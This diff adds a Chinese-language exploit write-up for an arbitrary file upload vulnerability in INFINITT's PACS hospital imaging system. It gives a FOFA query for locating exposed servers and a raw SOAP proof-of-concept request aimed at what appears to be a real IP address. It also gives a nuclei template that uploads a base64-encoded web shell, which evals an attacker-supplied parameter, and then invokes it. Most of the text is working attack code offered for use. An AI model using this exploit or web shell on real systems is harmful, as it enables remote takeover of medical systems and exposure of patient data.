@@ -1,0 +1,102 @@
+**漏洞描述**
+
+英飞达是一家专业开发医学影像系统的公司，成立于1994年.
+
+英飞达影像存档与通讯PACS系统INFINITT_PACS_WebJobUpload存在任意文件上传漏洞.
+
+**fofa搜索语句**
+
+```YAML
+"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
+```
+
+**影响版本**
+
+英飞达影像存档与通讯PACS系统INFINITT_PACS
+
+**漏洞复现**
+
+POC：
+
+```YAML
+
+POST /webservices/WebJobUpload.asmx HTTP/1.1
+Host: 91.92.185.75
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Content-Length: 407
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=utf-8
+Soapaction: "http://rainier/jobUpload"
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<jobUpload xmlns="http://rainier">
+<vcode>1</vcode>
+<subFolder></subFolder>
+<fileName>1234a.aspx</fileName>
+<bufValue>payload（要base64编码）</bufValue>
+</jobUpload>
+</soap:Body>
+</soap:Envelope>
+```
+
+回显
+
+/1/abcrce.asmx/Cmdshell?Pass=Response.Write("Hello,World")
+
+**nuclei poc**
+
+```yaml
+
+id: pacs-WebJobUpload-fileupload
+
+info:
+  name: 英飞达医学影像存档与通信系统 WebJobUpload 任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: 英飞达医学影像存档与通信系统 Picture Archiving and Communication System，它是应用在医院影像科室的系统，主要的任务就是把日常产生的各种医学影像(包括核磁，CT，超声，各种X光机，各种红外仪、显微仪等设备产生的图像)通过各种接口(模拟，DICOM，网络)以数字化的方式海量保存起来，当需要的时候在一定的授权下能够很快的调回使用，同时增加一些辅助诊断管理功能。它在各种影像设备间传输数据和组织存储数据具有重要作用。该系统WebJobUpload.asmx接口处存在任意文件上传漏洞，容易导致系统被远控。
+  metadata:
+    max-request: 1
+    fofa-query: "INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
+    verified: true
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(32))}}"
+requests:
+  - raw:
+      - |+
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+        Connection: close
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>{{file_name}}.asmx</fileName>
+        <bufValue>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+
+      - |
+        GET /1/{{file_name}}.asmx/Cmdshell?Pass=Response.Write("Hello,World") HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, 'Hello,World')"
+```
+
